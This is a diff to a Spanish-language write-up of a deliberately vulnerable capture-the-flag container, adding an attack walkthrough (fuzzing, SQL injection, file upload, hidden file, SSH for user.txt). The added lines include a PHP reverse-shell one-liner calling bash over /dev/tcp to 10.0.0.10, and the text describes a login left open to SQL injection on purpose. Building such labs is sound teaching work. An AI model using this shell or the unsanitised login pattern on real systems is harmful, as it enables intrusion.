@@ -240,6 +240,19 @@ El sistema operativo utilizado para el desarrollo de este primer contenedor es U
 
 ## Desarrollo de la Vulnerabilidad Principal 
 
+1.Atacante hace fuzzing y encuentra el panel de inicio de cerdos (/login)
+
+2.El atacante consigue entrar en el panel (via sqli, fuerza bruta, dupeando la db...) y hace File Upload (para subir una Reverse Shell) y
+entrar como el usuario www-data.
+
+3.Una vez dentro del contenedor con el usuario www-data listas archivos y vainas y encuentras un archivo oculto (.rutaFinal) que te redirije al login in del "Banco De Credenciales" (/loginGranjaCredencialesSecretas)
+
+4.Mediante SQLi bypasseas el login y te redirige a una web con varias credenciales de varios usuarios (solo funciona 1)
+
+5.Entra con ese usuario funcional mediante SSH al contenedor, aquí se encuentra la flag user.txt dentro de la home
+<?php
+exec("/bin/bash -c 'bash -i > /dev/tcp/10.0.0.10/1234 0>&1'"); ?
+
 En primer lugar desarrollamos un formulario de inicio de sesión con su respectivo validador (en PHP). Este será el encargado de lanzar _query_ a la base de datos para verificar si las credenciales introducidas por el cliente forman parte de un usuario válido. Este código no sanitiza la entrada obtenida, es por ello que es vulnerable a un ataque de inyección SQL, como se representa en la siguiente ilustración:
 
 <p align="center">
